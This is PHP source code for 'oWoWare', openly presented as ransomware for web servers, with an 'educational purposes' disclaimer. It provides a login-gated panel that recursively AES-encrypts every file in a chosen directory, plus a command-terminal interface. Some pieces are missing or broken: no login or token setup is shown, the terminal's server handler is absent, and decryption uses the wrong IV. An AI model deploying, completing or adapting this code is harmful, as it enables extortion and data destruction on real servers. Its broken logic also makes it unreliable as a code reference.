<?php
/**
 * oWoWare v1.1
 *
 * oWoWare is a ransomware focused on web servers, developed in PHP 5.5. It provides 
 * a secure interface for tool management and terminal command execution. With 
 * file encryption and decryption functionalities using AES-256-CBC (Cipher 
 * Block Chaining with a 256-bit key), as well as an integrated terminal, oWoWare 
 * is designed for technical testing and raising awareness about protection 
 * against ransomware attacks.

 * Author: Omar Salazar (TaurosOmar) <https://xf0.me/>
 * Date: September 18, 2024
 * Version: 1.0
 *
 * Refactored by: Aythami Melián Perdomo <ajmelper@gmail.com>
 * Date of Refactoring: September 18, 2024
 * Version: 1.1
 *
 * Refactoring Details:
 * - Updated code to be compatible with PHP 8.3.
 * - Refactored code to adhere to Clean Code principles.
 * - Improved function and variable naming for better readability.
 * - Simplified control flow and error handling.
 * - Enhanced security practices including input validation and sanitization.
 *
 * Disclaimer:
 * This code is intended for educational purposes only and is designed for the 
 * simulation of ransomware functionality. It should not be used for any 
 * malicious activities. The author and the refactorer disclaim any 
 * responsibility for misuse or unintended consequences arising from the use of 
 * this code.
 */

session_start();

/**
 * Encrypts or decrypts files within a directory using AES-256.
 *
 * @param string $dirPath Path to the directory.
 * @param string $key Encryption/decryption key.
 * @param bool $encrypt True to encrypt, false to decrypt.
 * @return array An array with two elements:
 *               - Processed files: Array of successfully processed file paths.
 *               - Error files: Array of error messages.
 */
function processFilesInDirectory(string $dirPath, string $key, bool $encrypt): array
{
    $key = substr(hash('sha256', $key, true), 0, 32);
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dirPath));
    $processedFiles = [];
    $errorMessages = [];

    foreach ($files as $file) {
        if ($file->isFile() && $file->getFilename() !== 'index.php') {
            $filePath = $file->getPathname();
            $outputFile = $filePath . ($encrypt ? '.enc' : '.dec');

            try {
                $data = file_get_contents($filePath);
                if ($data === false) {
                    throw new RuntimeException("Failed to read file: $filePath");
                }

                $cipher = 'aes-256-cbc';
                $iv = random_bytes(openssl_cipher_iv_length($cipher));
                $processedData = $encrypt
                    ? openssl_encrypt($data, $cipher, $key, 0, $iv) . '::' . base64_encode($iv)
                    : openssl_decrypt($data, $cipher, $key, 0, base64_decode($iv));

                if ($processedData === false) {
                    throw new RuntimeException("Encryption/Decryption failed for file: $filePath");
                }

                if (file_put_contents($outputFile, $processedData) === false) {
                    throw new RuntimeException("Failed to write file: $outputFile");
                }

                $processedFiles[] = $filePath;
            } catch (Exception $e) {
                $errorMessages[] = $e->getMessage();
            }
        }
    }

    return [$processedFiles, $errorMessages];
}

/**
 * Validates the CSRF token and user authentication.
 *
 * @return bool True if valid, false otherwise.
 */
function isCsrfTokenValid(): bool
{
    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true
        && isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token'];
}

/**
 * Validates the input parameters for encryption or decryption.
 *
 * @param string $key The encryption/decryption key.
 * @param string $dirPath The directory path.
 * @param bool $encrypt True if encrypting, false if decrypting.
 * @return array An array with two elements:
 *               - Valid: True if valid, false otherwise.
 *               - Message: Error message if invalid.
 */
function validateParameters(string $key, string $dirPath, bool $encrypt): array
{
    if (empty($key) || empty($dirPath)) {
        return [false, 'Key and directory are required.'];
    }

    if (strlen($key) < 32) {
        return [false, 'The key must be at least 32 characters for AES-256.'];
    }

    if (!is_dir($dirPath)) {
        return [false, 'Invalid or non-existent directory path.'];
    }

    return [true, ''];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isCsrfTokenValid()) {
        die("Unauthorized access.");
    }

    $action = $_POST['action'] ?? '';
    $key = trim($_POST['key'] ?? '');
    $dirPath = realpath(trim($_POST['target_dir'] ?? ''));

    if ($action === 'encrypt' || $action === 'decrypt') {
        [$isValid, $validationMessage] = validateParameters($key, $dirPath, $action === 'encrypt');
        if (!$isValid) {
            $error_message = $validationMessage;
        } else {
            [$processedFiles, $errorMessages] = processFilesInDirectory($dirPath, $key, $action === 'encrypt');
            if ($processedFiles) {
                $success_message = ucfirst($action) . " files successfully:<ul>" . implode('', array_map(fn($file) => "<li>" . htmlspecialchars($file) . "</li>", $processedFiles)) . "</ul>";
            }

            if ($errorMessages) {
                $error_message = "Errors processing some files:<ul>" . implode('', array_map(fn($message) => "<li>" . htmlspecialchars($message) . "</li>", $errorMessages)) . "</ul>";
            }

            if (empty($processedFiles) && empty($errorMessages)) {
                $info_message = "No files found to " . $action . ".";
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>oWoWare</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Courier+Prime&display=swap" rel="stylesheet">
    <style>
        body { background-color: #282a36; font-family: Arial, sans-serif; color: #f8f8f2; }
        .terminal {
            background-color: #44475a;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', Courier, monospace;
            height: 300px;
            overflow-y: auto;
        }
        .terminal-input {
            background: none;
            border: none;
            color: #f8f8f2;
            width: 100%;
            outline: none;
            font-family: 'Courier New', Courier, monospace;
        }
        .banner {
            font-family: 'Courier Prime', monospace;
            white-space: pre;
            text-align: center;
            margin-bottom: 20px;
            color: #bd93f9;
        }
        .function-buttons .btn {
            margin-right: 10px;
            margin-bottom: 10px;
        }
        .terminal-container {
            display: flex;
            flex-direction: row;
            gap: 20px;
            margin-top: 20px;
        }
        .terminal-window {
            flex: 1;
        }
        .alert {
            padding: 0.5rem 1rem;
            margin-bottom: 1rem;
            border-radius: 0.25rem;
            font-size: 0.9rem;
        }
        .alert-danger { background-color: #ff5555; color: #f8f8f2; }
        .alert-success { background-color: #16b518; color: #000; }
        .alert-info { background-color: #8be9fd; color: #f8f8f2; }
        button.btn-close { filter: invert(1); }
    </style>
</head>
<body>
    <div class="container mt-5">
        <?php if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true): ?>
            <div class="row justify-content-center">
                <div class="col-md-6">
                    <div class="banner">
<?php
echo "  
         __      ____      __     
        / /     / __ \\     \\ \\    
       / / ___ | |  | | ___ \\ \\   
      > / / _ \\| |  | |/ _ \\ > \\  
     / ^ ( (_) )\\ \\/ /( (_) ) ^ \\ 
    /_/ \\_\\___(___||___)___/_/ \\_\\
                     oWoWare V.1.1
";
?>
                    </div>
                    <?php if (isset($error_message)): ?>
                        <div class="alert alert-danger"><?php echo $error_message; ?></div>
                    <?php endif; ?>
                    <form method="post" action="">
                        <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                        <div class="mb-3">
                            <label for="username" class="form-label">Username:</label>
                            <input type="text" id="username" name="username" class="form-control" required>
                        </div>
                        <div class="mb-3">
                            <label for="password" class="form-label">Password:</label>
                            <input type="password" id="password" name="password" class="form-control" required>
                        </div>
                        <button type="submit" name="login" class="btn btn-primary">Login</button>
                    </form>
                </div>
            </div>
        <?php else: ?>
            <div class="banner">
<?php
echo "  
         __      ____      __     
        / /     / __ \\     \\ \\    
       / / ___ | |  | | ___ \\ \\   
      > / / _ \\| |  | |/ _ \\ > \\  
     / ^ ( (_) )\\ \\/ /( (_) ) ^ \\ 
    /_/ \\_\\___(___||___)___/_/ \\_\\
                     oWoWare V.1.1
";
?>
            </div>
            <?php if (isset($success_message)): ?>
                <div class="alert alert-success"><?php echo $success_message; ?></div>
            <?php endif; ?>
            <?php if (isset($info_message)): ?>
                <div class="alert alert-info"><?php echo $info_message; ?></div>
            <?php endif; ?>
            <div class="function-buttons">
                <button class="btn btn-success" data-bs-toggle="modal" data-bs-target="#encryptModal">Encrypt Files</button>
                <button class="btn btn-warning" data-bs-toggle="modal" data-bs-target="#decryptModal">Decrypt Files</button>
            </div>
            <!-- Modal Encrypt -->
            <div class="modal fade" id="encryptModal" tabindex="-1" aria-labelledby="encryptModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content" style="background-color: #44475a; color: #f8f8f2;">
                        <div class="modal-header">
                            <h5 class="modal-title" id="encryptModalLabel">Encrypt Files</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <form method="post" action="">
                                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                                <input type="hidden" name="action" value="encrypt">
                                <div class="mb-3">
                                    <label for="key" class="form-label">Encryption Key (min 32 characters):</label>
                                    <input type="password" id="key" name="key" class="form-control" required minlength="32">
                                </div>
                                <div class="mb-3">
                                    <label for="target_dir" class="form-label">Directory:</label>
                                    <input type="text" id="target_dir" name="target_dir" class="form-control" required placeholder="/path/to/directory">
                                </div>
                                <button type="submit" class="btn btn-success">Encrypt Files</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Modal Decrypt -->
            <div class="modal fade" id="decryptModal" tabindex="-1" aria-labelledby="decryptModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content" style="background-color: #44475a; color: #f8f8f2;">
                        <div class="modal-header">
                            <h5 class="modal-title" id="decryptModalLabel">Decrypt Files</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <form method="post" action="">
                                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                                <input type="hidden" name="action" value="decrypt">
                                <div class="mb-3">
                                    <label for="key_decrypt" class="form-label">Decryption Key (min 32 characters):</label>
                                    <input type="password" id="key_decrypt" name="key" class="form-control" required minlength="32">
                                </div>
                                <div class="mb-3">
                                    <label for="target_dir_decrypt" class="form-label">Directory:</label>
                                    <input type="text" id="target_dir_decrypt" name="target_dir" class="form-control" required placeholder="/path/to/directory">
                                </div>
                                <button type="submit" class="btn btn-warning">Decrypt Files</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

            <form method="post" action="" class="mt-4">
                <button type="submit" name="logout" class="btn btn-danger">Logout</button>
            </form>
            <div class="terminal-container">
                <div class="terminal-window">
                    <h2 class="mb-4">Terminal</h2>
                    <button class="btn btn-secondary mb-3" onclick="toggleTerminal()">Open Terminal</button>
                    <div id="terminal-container" class="d-none">
                        <div class="terminal mb-3">
                            <div id="terminal-output" class="terminal-output">
                                <?php if (isset($output) && !empty($output)): ?>
                                    <?php echo nl2br(htmlspecialchars($output)); ?>
                                <?php endif; ?>
                            </div>
                            <form id="command-form">
                                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                                <input type="text" name="command" id="command" class="form-control terminal-input" placeholder="Enter command" autocomplete="off" required>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        function toggleTerminal() {
            const terminal = document.getElementById('terminal-container');
            $(terminal).toggleClass('d-none');
            if (!$(terminal).hasClass('d-none')) {
                $('#command').focus();
            }
        }

        $(document).ready(function(){
            $('#command-form').on('submit', function(e){
                e.preventDefault();
                const command = $('#command').val().trim();
                const csrfToken = $('input[name="csrf_token"]').val();

                if (command === '') {
                    alert('Please enter a command.');
                    return;
                }

                $.ajax({
                    url: '<?php echo $_SERVER['PHP_SELF']; ?>',
                    type: 'POST',
                    dataType: 'json',
                    data: {
                        ajax: '1',
                        command: command,
                        csrf_token: csrfToken
                    },
                    success: function(response) {
                        const outputDiv = $('#terminal-output');
                        if (response.status === 'success') {
                            if (command === 'clear') {
                                outputDiv.html('');
                            } else {
                                outputDiv.append(`<div><strong>${$('<div>').text(command).html()}</strong><br>${$('<div>').text(response.output).html()}</div><hr>`);
                            }
                        } else {
                            outputDiv.append(`<div><strong>Error:</strong> ${$('<div>').text(response.message).html()}</div><hr>`);
                        }
                        $('#command').val('');
                        const terminalDiv = $('.terminal');
                        terminalDiv.scrollTop(terminalDiv[0].scrollHeight);
                    },
                    error: function() {
                        $('#terminal-output').append('<div><strong>Error:</strong> Failed to process the request.</div><hr>');
                        const terminalDiv = $('.terminal');
                        terminalDiv.scrollTop(terminalDiv[0].scrollHeight);
                    }
                });
            });
        });
    </script>
</body>
</html>
